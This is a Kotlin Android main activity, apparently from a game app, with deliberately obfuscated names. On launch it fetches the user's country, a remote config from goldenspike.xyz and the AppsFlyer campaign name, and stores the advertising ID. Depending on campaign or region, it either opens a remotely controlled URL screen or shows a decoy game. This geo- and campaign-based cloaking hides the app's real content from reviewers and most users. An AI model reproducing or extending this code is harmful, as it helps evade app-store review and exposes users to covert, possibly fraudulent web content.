package com.tapenjoy.actx

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.tapenjoy.actx.StarterClass.Companion.C1hhhhh
import com.tapenjoy.actx.StarterClass.Companion.gtghyhyhy
import com.tapenjoy.actx.StarterClass.Companion.ghyhplyplhy
import com.tapenjoy.actx.StarterClass.Companion.rfrgtgttt
import com.tapenjoy.actx.databinding.ActivityMainBinding
import com.tapenjoy.actx.gogogoa.GaaaaameraatorActivity
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var bobobob: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        bobobob = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bobobob.root)
        GlobalScope.launch(Dispatchers.IO) {
            kpkpkpkp
        }

        AppsFlyerLib.getInstance()
            .init("AuhgXrXNkzhRjghyJwMJ39", kikolollo, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun dadadadad(){
        val gtgtgtgt = AdvertisingIdClient(applicationContext)
        gtgtgtgt.start()
        val adIdInfo = gtgtgtgt.info.id
        Hawk.put(gtghyhyhy, adIdInfo)
    }


    private suspend fun gtggtgtgt(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiiiiiInterface::class.java)

        val kokokokok = retrofitBuilder.getData().body()?.countryCode
        return kokokokok

    }


    private suspend fun kpkpkpkpk(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://goldenspike.xyz/")
            .build()
            .create(ApiiiiiInterface::class.java)

        val lkoklkokl = retroBuildTwo.getDataDev().body()?.view
        val ghyyhyhy = retroBuildTwo.getDataDev().body()?.appsChecker
        Hawk.put(ghyhplyplhy, ghyyhyhy)
        Hawk.put(rfrgtgttt, lkoklkokl)
        val retroData = retroBuildTwo.getDataDev().body()?.geo
        return retroData
    }

    private val kpkpkpkp: Job = GlobalScope.launch(Dispatchers.IO) {
        val hyhjyjhyji: String = gtggtgtgt().toString()
        val gtgtggt = kpkpkpkpk().toString()
        var juujuuju: String? = Hawk.get(C1hhhhh)
        val dedede: String? = Hawk.get(ghyhplyplhy)


        dadadadad()
        if (dedede == "1") {
            val vfvf = Executors.newSingleThreadScheduledExecutor()
            vfvf.scheduleAtFixedRate({
                if (juujuuju != null) {
                    if (juujuuju!!.contains("tdb2") || gtgtggt.contains(hyhjyjhyji)) {

                        vfvf.shutdown()
                        startActivity(Intent(this@MainActivity, OpenUrlActivity::class.java))
                        finish()
                    } else {
                        vfvf.shutdown()
                        startActivity(Intent(this@MainActivity, GaaaaameraatorActivity::class.java))
                        finish()
                    }
                } else {
                    juujuuju =  Hawk.get(C1hhhhh)
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (gtgtggt.contains(hyhjyjhyji)) {
            startActivity(Intent(this@MainActivity, OpenUrlActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GaaaaameraatorActivity::class.java))
            finish()
        }
    }

    private val kikolollo = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1hhhhh, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
}



